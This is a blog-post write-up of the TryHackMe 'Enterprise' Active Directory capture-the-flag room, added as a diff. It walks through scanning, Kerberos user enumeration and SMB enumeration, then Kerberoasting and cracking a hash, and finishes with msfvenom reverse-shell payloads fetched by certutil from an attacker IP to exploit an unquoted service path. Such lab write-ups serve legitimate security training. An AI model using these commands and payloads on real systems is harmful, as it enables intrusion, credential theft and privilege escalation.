@@ -1,0 +1,229 @@
+---
+title: Enterprise
+heroImage: /src/assets/images/ent/cover.png
+category: CTF
+description: You scan the network and there's only the Domain Controller...
+pubDate: 2024-11-01T23:00:00.000Z
+tags:
+  - Active Directory
+  - THM
+  - Tryhackme
+---
+
+This TryhackMe room that helps solidify Active Directory penetration testing.
+
+Machine IP: 10.10.105.193
+
+# Scanning
+
+## Nmap
+
+```
+sudo nmap -sC -sV -O 10.10.105.193
+```
+
+![](../../assets/images/ent/nmap1.png)
+
+We have port 53,88,135,389,445,464, 636 etc.
+
+Also, rustscan to see if we have more ports running on the target
+
+```
+└─$ rustscan -a 10.10.105.193 --ulimit 5000 -- -A -sC -oN nmap_scan
+```
+
+![](../../assets/images/ent/nmap2.png)
+
+We found an extra port 7790
+![](../../assets/images/ent/rust2.png)
+
+Also see the domain: "LAB.ENTERPRISE.THM", "LAB-DC.LAB.ENTERPRISE.THM", "ENTERPRISE.THM"
+
+![](../../assets/images/ent/hosts.png)
+
+Find potential users
+
+```
+kerbrute_linux_amd64 userenum --dc 10.10.105.193 -d LAB.ENTERPRISE.THM /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+![](../../assets/images/ent/kerb.png)
+Save output in raw_users.txt, then we clean the file to maintain only users
+
+```
+cat raw_users.txt | cut -d " " -f 14 | cut -d "@" -f 1 | tee users.txt
+cat raw_users.txt | cut -d " " -f 14 | tee user_domain.txt
+```
+
+![](../../assets/images/ent/users.png)
+![](../../assets/images/ent/domain_user.png)
+
+## DNS Enum
+
+```
+└─$ dig  @10.10.105.193 LAB.ENTERPRISE.THM
+```
+
+![](../../assets/images/ent/dns.png)
+
+Since port 80 is open, let's visit it
+![](../../assets/images/ent/88.png)
+
+## Web enumeration
+
+FILES:
+
+```
+export URL="http://lab.enterprise.thm/FUZZ"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
+```
+
+![](../../assets/images/ent/files.png)
+robots.txt
+![](../../assets/images/ent/robot.png)
+
+DIRECTORIES
+
+```
+export URL="http://lab.enterprise.thm/FUZZ/"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL
+```
+
+## SMB enumeration
+
+```
+smbclient -L \\\\10.10.105.193\\
+smbclient \\\\10.10.105.193\\Docs
+smbclient \\\\10.10.105.193\\Users
+```
+
+![](../../assets/images/ent/smb1.png)
+![](../../assets/images/ent/smb2.png)
+![](../../assets/images/ent/smb3.png)
+
+## Enumerate port 7990
+
+We get an Atlassian instance
+![](../../assets/images/ent/7790.png)
+
+FILES:
+
+```
+export URL="http://10.10.105.193:7790/FUZZ"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
+```
+
+![](../../assets/images/ent/7790_1.png)Projectone
+
+DIRECTORIES
+
+```
+export URL="http://10.10.105.193:7990/FUZZ/"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
+```
+
+Recall that we have a list of potential users, we bruteforce using Burp Intruder. That did not work. Now, since we have an Atlassian page, we can deduce that we would have a github repo of Enterprise THM.
+
+![](../../assets/images/ent/git.png)
+
+We see this THM enterprise repo, looking closely, we see the About-Us repo. In the people tab, we see Nik-enterprise-dev .
+![](../../assets/images/ent/git_page.png)
+![](../../assets/images/ent/peep.png)
+
+Digging deeper, we see a new powershell repo with hardcoded credentials (nik: ToastyBoi!)
+![](../../assets/images/ent/ps.png)
+
+Try credentials on SMB logins:
+
+```
+crackmapexec smb 10.10.137.231 -u nik -p 'ToastyBoi!'"
+```
+
+![](../../assets/images/ent/crack.png)
+
+It works!! Let's see enumerate SMB with the newly discovered valid credentials:
+
+```
+smbclient -L 10.10.137.231 -U nik
+```
+
+![](../../assets/images/ent/smb4.png)
+
+```
+smbclient \\\\10.10.137.231\\ADMIN$ -U nik
+```
+
+We still get same access like we did initially. Let's circle back to the Actice Directory attack strategy.
+![](../../assets/images/ent/ad.png)
+
+This is from my note. So, we could check if the nik user is kerberoastable using GetSPN command:
+
+```
+impacket-GetUserSPNs -request LAB.ENTERPRISE.THM/nik -dc-ip 10.10.137.231
+```
+
+![](../../assets/images/ent/ker.png)
+We see that the nik user is indeed kerberoastable and we can proceed to cracking the hash.
+
+```
+john --format=krb5tgs hahs --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![](../../assets/images/ent/john.png)
+
+It means we can login via winrm and psexec using (bitbucket: littleredbucket), but they didn't work. I eventually tied xfreerdp.
+
+```
+xfreerdp /v:10.10.137.231 /u:bitbucket /p:littleredbucket /dynamic-resolution +clipboard
+```
+
+![](../../assets/images/ent/rdp.png)
+
+The user flag is just on the desktop.
+
+### Getting Root
+
+First, we need to find a way to get a stable shell, preferabbly getting the shell on our attacker machine. This can be done by using msfvenom.
+
+#### Create payload
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.67.255 LPORT=4443 -f exe -o shell.exe
+```
+
+Download payload on victim machine and execute
+
+```
+certutil.exe -urlcache -f http://10.11.67.255/shell.exe shell.exe
+```
+
+We have a shell on our kali machine:
+![](../../assets/images/ent/stable.png)
+
+Now we can run winpeas to find low-haniging fruits.
+
+#### Convert shell to powershell
+
+```
+powershell -ep bypass
+```
+
+We notice an unquoted service path vulnerability we can take advantage of. The service is running zerotieroneservice.
+![](../../assets/images/ent/unq.png)
+Path: C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe.
+We need to create a reverse shell payload, replace it with the zero tier one file.
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.67.255 LPORT=4433 -f exe -o ZeroTier.exe
+```
+
+![](../../assets/images/ent/msf.png)
+
+```
+certutil.exe -urlcache -f http://10.11.67.255/ZeroTier.exe ZeroTier.exe
+copy ZeroTier.exe "C:\Program Files (x86)\Zero Tier\Zero Tier One\"
+Start-Service zerotieroneservice
+```
+
+...and we get nt authority
+![](../../assets/images/ent/root.png)
